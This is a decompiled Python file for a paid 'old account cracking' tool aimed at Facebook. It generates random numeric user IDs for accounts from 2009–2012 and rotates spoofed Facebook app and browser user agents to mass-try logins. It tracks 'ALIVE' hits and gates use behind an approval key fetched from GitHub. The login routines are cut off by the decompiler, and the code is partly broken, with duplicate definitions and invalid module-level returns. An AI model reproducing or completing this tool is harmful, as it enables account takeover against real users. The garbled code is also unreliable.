# Source Generated with Decompyle++
# File: layer_99.pyc (Python 3.12)

import uuid
import base64
import os
import hashlib
import zlib
import subprocess
import time
import platform
import requests
import bs4
import json
import sys
import time
import random
import re
import subprocess
import platform
import struct
import string
import uuid
import base64
import zlib
import marshal
import zlib
import base64
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket
import ssl
import certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from io import BytesIO
import datetime
from urllib.parse import urlencode
from pystyle import Colors, Colorate, Center
import pycurl
import pycurl
from io import BytesIO
import certifi
import sys
import time
import random
import os
os.system('clear')
import pystyle
white = '\x1b[1;97m'
yelloww = '\x1b[1;33m'
green = '\x1b[38;5;49m'
G1 = '\x1b[38;5;155m'
green1 = '\x1b[38;5;154m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
G6 = '\x1b[38;5;52m'
s = '\x1b[0m'
W = '\x1b[1;30m'
Y = '\x1b[1;93m'
red = '\x1b[38;5;160m'
B = '\x1b[1;95m'
BE = '\x1b[1;35m'
X = '\x1b[1;96m'
Z = '\x1b[1;95m'
Y = '\x1b[1;93m'
U = '\x1b[1;94m'
V = '\x1b[38;5;47m'
T = '\x1b[38;5;48m'
Q = '\x1b[38;5;49m'
P = '\x1b[38;5;50m'
O = '\x1b[38;5;51m'
N = '\x1b[38;5;52m'
M = '\x1b[38;5;205m'
L = '\x1b[96;1m'
K = '\x1b[1;91m'
WH = '\x1b[1;97m'
orange = '\x1b[38;5;196m'
yellow = '\x1b[38;5;208m'
black = '\x1b[1;30m'
pink = '\x1b[1;35m'
rad = '\x1b[38;5;160m'
YLW = '\x1b[1;33m'
blue = '\x1b[38;5;6m'
purple = '\x1b[1;35m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
faltu = '\x1b[1;47m'
pvt = '\x1b[1;0m'
gren = '\x1b[38;5;154m'
gas = '\x1b[1;32m'
G = '\x1b[1;32m'
R = '\x1b[1;31m'
Y = '\x1b[1;33m'
W = '\x1b[1;37m'
C = '\x1b[1;36m'
green2 = Colors.green_to_white
white2 = Colors.white
red2 = Colors.red
style = f'''{white2}[{G2}â{white2}]'''
os.system('clear')

def py_curl(url):
    curl = pycurl.Curl()
    buffer = BytesIO()
    curl.setopt(curl.URL, url)
    curl.setopt(curl.WRITEDATA, buffer)
    curl.setopt(curl.SSL_VERIFYPEER, 1)
    curl.setopt(curl.SSL_VERIFYHOST, 2)
    curl.setopt(curl.CAINFO, certifi.where())
    curl.perform()
    response_body = buffer.getvalue().decode('utf-8')
    curl.close()
    return response_body
# WARNING: Decompyle incomplete

import sys
import time

def ethan(z):
    for a in z + '\n':
        sys.stdout.write(a)
        sys.stdout.flush()
        time.sleep(0.05)


def ua():
    ver = str(random.choice(range(130, 136)))
    ver2 = str(random.choice(range(80, 181)))
    return f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36'''

import random

def Samsung():
    Anderson = random.choice([
        '10',
        '13',
        '7.0.0',
        '7.1.1',
        '9',
        '12',
        '11',
        '9.0',
        '8.0.0',
        '7.1.2',
        '7.0',
        '4',
        '5',
        '4.4.2',
        '5.1.1',
        '6.0.1',
        '9.0.1'])
    model = random.choice([
        'GT-I9505',
        'SM-T835',
        'SM-S901U',
        'MMB29K',
        'SM-S134DL',
        'SM-J250F',
        'SM-A217F',
        'SM-A326B',
        'SM-A125F',
        'SM-A720F',
        'SM-A326U',
        'SM-G532M',
        'SM-J410G',
        'SM-A205GN',
        'SM-A505GN',
        'SM-G930F',
        'SM-J210F',
        'SM-N9005',
        'SM-J210F'])
    vir = str(random.randint(111111111, 999999999))
    cho = str(random.randint(43, 447))
    fb = random.choice([
        'com.facebook.katana|FB4A',
        'com.facebook.orca|Orca-Android'])
    (FBAN, platform) = fb.split('|')
    ua = f'''Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) [FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.randint(1, 3)}.0,width={random.randint(720, 1500)},height={random.randint(1500, 2000)}}};FB_FW/1;]'''
    return ua


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'''5{bx}.{bV}'''
    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice([
        '2',
        '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'''5{cx}.{cV}'''
    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice([
        '2',
        '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
    D = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'''
    return random.choice([
        A,
        B,
        C,
        D])


def generate_user_agent():
    windows_versions = [
        '10.0',
        '6.3',
        '6.1']
    chrome_major = random.randint(90, 115)
    chrome_build = random.randint(4000, 5100)
    chrome_patch = random.randint(30, 150)
    chrome_minor = random.randint(0, 5)
    letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    rand_letter1 = random.choice(letters)
    rand_letter2 = random.choice(letters)
    rand_number = random.randint(1, 999)
    User_agent = f'''Mozilla/5.0 (Windows NT {random.choice(windows_versions)}; Win64; x64){rand_letter1}{rand_number}{rand_letter2} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/537.36'''
    return user_agent


def fuck_xnxx():
    rr = random.randint
    aZ = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    rx = random.randrange(1, 999)
    url6 = f'''Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'''
    return url6


def fuck_xnxxxx():
    mcc = random.choice([
        'SM-F711B',
        'SM-F711N',
        'SM-F711U',
        'SM-F711U1',
        'SM-E025F'])
    url1 = f'''[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{mcc};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'''
    return url1


def fuck_xx():
    url3 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
    return url3


def ua():
    aa = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    return aa


def fuck_xnxxxxx():
    realmi = random.choice([
        'RMP2107',
        'RMX3770',
        'RMX2176',
        'RMX3939',
        'RMX3868'])
    url4 = '[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/' + realmi + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    return url4


def ua2():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
    rx = random.randrange(1, 999)
    return f'''Mozilla/5.0 (Windows NT {rr(9, 11)}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){rr(99, 149)}.0.{rr(4500, 4999)}.{rr(35, 99)} Chrome/{rr(99, 175)}.0.{rr(0, 5)}.{rr(0, 5)} Safari/537.36'''


def ua():
    rr = random.randint
    aZ = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    zA = random.choice([
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'g',
        'h',
        'i',
        'j',
        'k',
        'l',
        'm',
        'n',
        'o',
        'p',
        'q',
        'r',
        's',
        't',
        'u',
        'v',
        'w',
        'x',
        'y',
        'z'])
    rx = random.randrange(1, 999)
    xx = f'''Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'''
    return xx


def check_approval():
    uid = str(os.geteuid()) + os.getlogin()
    local_key = 'KIFFY-' + uid
    print(f'''[KEY] Your Approval Key: {local_key}''')
    url = 'https://github.com/KCL-404/crack/blob/main/locked.txt'
    keys = requests.get(url).text
    if local_key in keys:
        return True
    input('[!] Key not approved. Press Enter to exit.')
    sys.exit('[x] Request approval and try again.')
    return None
# WARNING: Decompyle incomplete

fuck = '\n┏━━┳━━┳━━┳━┳━━┳━━┳━┳┳━━┓\n┃━━╋┓┏┫┏┓┃╋┣┓┏┻┃┃┫┃┃┃┏━┫\n┣━━┃┃┃┃┣┫┃┓┫┃┃┏┃┃┫┃┃┃┗┓┃\n┗━━┛┗┛┗┛┗┻┻┛┗┛┗━━┻┻━┻━━┛\n'
print(fuck)
time.sleep(5)
logo = Colorate.Horizontal(Colors.green_to_white, '\n\n█▀█ █░█ █▄▀ █▀▀\n█▀▀ █▄█ █░█ ██▄ ')

def linex():
    print(Colorate.Horizontal(Colors.red_to_white, '﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌'))

version = f'''{G}PAID{R} v0.1'''
info = f'''\n{Y}[$] {G}TOOL NAME   {G}OLD ACCOUNT CRACKING\n{Y}[$] {G}ACCESS      {G}LIFETIME = ₱100\n'''
main_style = f'''\n{W}[{R}1{W}] {G}START 2009-2010 CLONE\n{W}[{R}2{W}] {G}START 2011-2012 CLONE\n{W}[{R}0{W}] {R}EXIT\n'''
method_style = f'''\n{W}[{R}1{W}] {G}METHOD-{W}[{R}M1{W}]\n{W}[{R}2{W}] {G}METHOD-{W}[{R}M2{W}]\n'''
limit_style = f'''{Y}[Example Limits] â¤ {G}10000 20000 50000 99999\n'''

def main_logo():
    os.system('clear')
    print(logo)
    linex()
    print(info)
    linex()

loop = 0
oks = []
cps = []
ua = []
ussr = []
tw = []

def main():
    main_logo()
    print(main_style)
    linex()
    year_select = input(f'''{white2}[{red2}?{white2}] {G2}CHOOSE {white2}: ''')
    if year_select in ('A', 'a', '01', '1'):
        old_2009_2010()
        return None
    if year_select in ('B', 'b', '02', '2'):
        old_2011_2012()
        return None
    if year_select in ('C', 'c', '03', '3'):
        main()
        return None
    if year_select in ('O', 'o', '00', '0'):
        os.system('exit')
        return None
    main()


def old_2009_2010():
    user = []
    main_logo()
    print(limit_style)
    linex()
    limit = int(input(f'''{style}{G2} LIMIT    {white2}:{G2} '''))
    year_code = '10000'
    clone_system = '2009-2010'
    main_logo()
    print(method_style)
    linex()
    method = input(f'''{white2}[{red2}?{white2}] {G2}CHOOSE {white2}â¶{G2}ï¸ ''').strip().lower()
    for i in range(limit):
        data = str(random.choice(range(1000000000, 1999999999)))
        user.append(data)
# WARNING: Decompyle incomplete


def old_2011_2012():
    user = []
    main_logo()
    print(limit_style)
    linex()
    limit = int(input(f'''{style}{G2} LIMIT    {white2}:{G2} '''))
    year_code = '10000'
    clone_system = '2011-2012'
    main_logo()
    print(method_style)
    linex()
    method = input(f'''{white2}[{red2}?{white2}] {G2}CHOOSE {white2}â¶{G2}ï¸ ''').strip().lower()
    for i in range(limit):
        data = str(random.choice(range(1000000000, 1999999999)))
        user.append(data)
# WARNING: Decompyle incomplete


def _method_A_(uid, user):
    Session = requests.Session()
    agent = windows()
    sys.stdout.write(f'''\r\r{rad}[{green}PUKE-OLD-M1{rad}]{white2}~{rad}[\x1b[1;97m{loop}{rad}]{white2}~{rad}[{green1}ALIVE{white2}â¢{G2}{len(oks)}{rad}]''')
    sys.stdout.flush()
# WARNING: Decompyle incomplete


def _method_B_(uid, user):
    Session = requests.Session()
    agent = Samsung()
    sys.stdout.write(f'''\r\r{rad}[{green}PUKE-OLD-M2{rad}]{white2}~{rad}[\x1b[1;97m{loop}{rad}]{white2}~{rad}[{green1}ALIVE{white2}â¢{G2}{len(oks)}{rad}]''')
    sys.stdout.flush()
# WARNING: Decompyle incomplete

if __name__ == '__main__':
    if check_approval():
        main()
        return None
    return None
return None
# WARNING: Decompyle incomplete
